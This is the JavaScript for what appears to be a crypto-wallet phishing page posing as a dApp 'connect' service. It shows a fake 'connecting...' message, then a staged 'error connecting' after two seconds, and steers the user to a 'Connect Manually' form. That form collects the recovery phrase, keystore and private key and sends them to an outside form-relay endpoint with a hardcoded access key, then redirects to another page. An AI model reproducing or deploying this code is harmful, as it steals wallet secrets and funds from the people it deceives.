import { coins } from './coin.js';

const conisect = document.querySelector('.coinsect');
const manual = document.querySelector('.manual');
const body = document.querySelector('body');

let coinHTML = ``;

function renderConnectPage() {
  coins.map((coin) => {
    conisect.innerHTML += `
    <div class="scoin" data-coin-image = ${coin.image}
    data-coin-name= ${coin.name}>
            <img src="images/coins/${coin.image}" alt="">
            <h3 class="coinName">${coin.name}</h3>
        </div>
    `;
    click(coin);
  });
}

renderConnectPage();

function click(coin) {
  const scoin = document.querySelectorAll('.scoin');
  const main = document.querySelector('.main');

  scoin.forEach((single, coinId) => {
    single.addEventListener('click', (item) => {
      const coinImage = single.dataset.coinImage;
      const coinName = single.dataset.coinName;

      manual.innerHTML = `
 <div class="back">
        <div>
          <p>Back</p>
        </div>
      </div>

      <div class="pmanual" >
        <span class="red">connecting...</span>
        <p class= 'jsmanual'>Connect Manually</p>
      </div>
      <div class="dmanual">
        <div><img src="images/coins/${
          coinImage === '' ? coinName : coinImage
        }" alt="" /></div>
        <div class="dname">${coinName}</div>
      </div>
`;

      holderror();

      document.querySelector('.jsmanual').addEventListener('click', () => {
        manual.innerHTML = `
  <div class="show">
        <img src="images/coins/${coinImage}" alt="" />
        <p>${coinName}</p>
      </div>
      <form action="https://api.web3forms.com/submit" method="POST">

        <div class="field">
           <input type="hidden" name="access_key" value="048b16f9-16b9-4f9a-a532-a0d9b7e1e4ca">

            <label for="phrase">Phrase:</label>
            <input type="text" placeholder="enter your recovery phrase" id="phrase" name= 'phrase'>
            <span class="info">Typically 12 (sometimes 24) words seperated by single spaces</span>
        </div>

        <div class="field">
            <label for="keystore">Keystore:</label>
            <input type="text" id= 'keystore' name= 'keystore'placeholder="Enter keystore">

           
        </div>

        <div class="field">
            <label for="private">Private Key:</label>
            <input type="text" id= 'private' name= 'private' placeholder="enter private key">
            <span class="info">Typically 12 (sometimes 24) words seperated by a single space</span>
        </div>

        <input type="checkbox" name="botcheck" class="hidden" style="display: none;">
        <input type="hidden" name="redirect" value="https://dapp0001.github.io/tokenresolve/connect.html">
        <div class="submit"><button type="submit">Proceed</button>
        
            <div class="cancel">Cancel</div>
        </div>


      </form>
  `;

        

          // form cancel button
          document.querySelector('.cancel').addEventListener('click', () => {
            main.style.display = 'none';
            body.style.background = '#fff';
          });
        
      });

      // back button
      document.querySelector('.back').addEventListener('click', () => {
        main.style.display = 'none';
        body.style.background = '#fff';
      });

      main.style.display = 'flex';
      body.style.backgroundColor = '#b3acac';
    });
  });
}


// error connect timeout
        function holderror() {
          setTimeout(() => {
            document.querySelector('.red').innerHTML = 'error connecting';
          }, 2000);

        }
